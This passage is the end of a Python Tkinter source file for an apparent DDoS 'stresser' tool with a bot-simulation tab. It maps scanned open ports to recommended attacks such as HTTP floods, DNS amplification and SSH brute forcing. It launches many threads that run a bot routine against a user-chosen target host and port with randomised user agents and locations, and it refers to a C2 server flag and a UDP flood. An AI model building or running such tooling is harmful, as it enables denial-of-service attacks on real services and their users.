            self.port_tree.delete(item)

        # Insert new results
        for port_service, recommendation in results:
            self.port_tree.insert('', tk.END, values=(port_service, recommendation))

        success_msg = f"Scan complete for {target}. Open ports: {len(results)}"
        self.update_status(success_msg)
        print(f"[SCAN] {success_msg}")


    def get_attack_recommendation(self, port, service):
        recs = {
            80: "HTTP Flood",
            443: "HTTPS Flood",
            21: "FTP Brute Sim",
            22: "SSH Brute Sim / Slowloris",
            23: "Telnet Flood",
            53: "DNS Amplification / UDP Flood",
            8080: "HTTP Flood",
            25: "SMTP Flood Sim",
            110: "POP3 Flood Sim",
            143: "IMAP Flood Sim"
        }
        return recs.get(int(port), "Generic Flood")

    # --- Bot Simulator Tab ---
    def setup_bot_sim_tab(self):
        frame = tk.Frame(self.tab_bot_sim, bg='#0a0a1a')
        frame.pack(fill='both', expand=True, padx=20, pady=20)

        # Bot Simulation Control
        control_frame = tk.LabelFrame(frame, text="Bot Simulation Control", bg='#0a0a1a', fg='white')
        control_frame.pack(fill='x', pady=10)

        tk.Button(control_frame, text="Generate 10 Realistic Bots", command=lambda: self.generate_realistic_bots(10), bg='#33334d', fg='white').pack(side=tk.LEFT, padx=5)
        tk.Button(control_frame, text="Generate 50 Realistic Bots", command=lambda: self.generate_realistic_bots(50), bg='#33334d', fg='white').pack(side=tk.LEFT, padx=5)
        tk.Button(control_frame, text="Generate 100 Realistic Bots", command=lambda: self.generate_realistic_bots(100), bg='#33334d', fg='white').pack(side=tk.LEFT, padx=5)

        # Bot OS Distribution
        dist_frame = tk.LabelFrame(frame, text="Bot OS Distribution", bg='#0a0a1a', fg='white')
        dist_frame.pack(fill='both', expand=True, pady=10)

        # Create a canvas with scrollbar for OS list
        canvas_frame = tk.Frame(dist_frame, bg='#0a0a1a')
        canvas_frame.pack(fill='both', expand=True)

        canvas = tk.Canvas(canvas_frame, bg='#0a0a1a')
        scrollbar_v = ttk.Scrollbar(canvas_frame, orient="vertical", command=canvas.yview)
        scrollbar_h = ttk.Scrollbar(canvas_frame, orient="horizontal", command=canvas.xview) # Horizontal scrollbar
        scrollable_frame = tk.Frame(canvas, bg='#0a0a1a')

        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(
                scrollregion=canvas.bbox("all")
            )
        )

        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar_v.set, xscrollcommand=scrollbar_h.set) # Configure both scrollbars

        # Display OS distribution
        for i, os_info in enumerate(BOT_OS_TYPES):
            row_frame = tk.Frame(scrollable_frame, bg='#0a0a1a')
            row_frame.pack(fill='x', padx=5, pady=2)

            tk.Label(row_frame, text=f"{os_info['name']} ({os_info['arch']})", bg='#0a0a1a', fg='white', width=30, anchor='w').pack(side=tk.LEFT)
            tk.Label(row_frame, text=os_info['priv'], bg='#0a0a1a', fg='yellow', width=15).pack(side=tk.LEFT)
            # Progress bar for visualization
            progress = ttk.Progressbar(row_frame, length=200, mode='determinate')
            progress.pack(side=tk.LEFT, padx=5)
            progress['value'] = random.randint(20, 100)  # Simulated usage

        canvas.pack(side="left", fill="both", expand=True)
        scrollbar_v.pack(side="right", fill="y")
        scrollbar_h.pack(side="bottom", fill="x") # Pack horizontal scrollbar

    def generate_realistic_bots(self, count):
        """Generate bots with realistic OS distribution"""
        target = self.target_host.get() or "127.0.0.1"
        port = int(self.target_port.get() or "80")
        attack_type = self.attack_type.get()

        for i in range(count):
            # Weighted selection for more realistic distribution
            weights = [5, 8, 3, 10, 12, 6, 4, 7, 3, 2, 4, 2, 3, 2, 3, 2, 6, 4, 2, 1]  # Windows/Ubuntu more common
            bot_profile = random.choices(BOT_OS_TYPES, weights=weights, k=1)[0]
            bot_id = generate_bot_id()
            user_agent = get_random_user_agent()
            location = get_random_location() if self.geo_distribution_var.get() else "Unknown"

            bot_thread = threading.Thread(
                target=self.simulate_bot,
                args=(bot_id, target, port, attack_type, bot_profile, user_agent, location),
                daemon=True
            )
            bot_thread.start()
            self.bot_count += 1

        self.bot_var.set(str(self.bot_count))
        self.update_status(f"Generated {count} realistic bots")

    def on_closing(self):
        print("[INFO] Closing application...")
        if self.bot_list_update_job:
            self.root.after_cancel(self.bot_list_update_job)
        global C2_SERVER_RUNNING
        C2_SERVER_RUNNING = False
        # Stop any local UDP flood
        self.udp_flooding = False
        sys.stdout = sys.__stdout__
        self.root.destroy()
        print("[INFO] Application closed.")

# --- Main Execution ---
if __name__ == "__main__":
    try:
        root = tk.Tk()
        app = SimplifiedStresserGUI(root)
        root.mainloop()
    except Exception as e:
        sys.stdout = sys.__stdout__
        print(f"[FATAL ERROR] Failed to start application: {e}")
        import traceback
        traceback.print_exc()
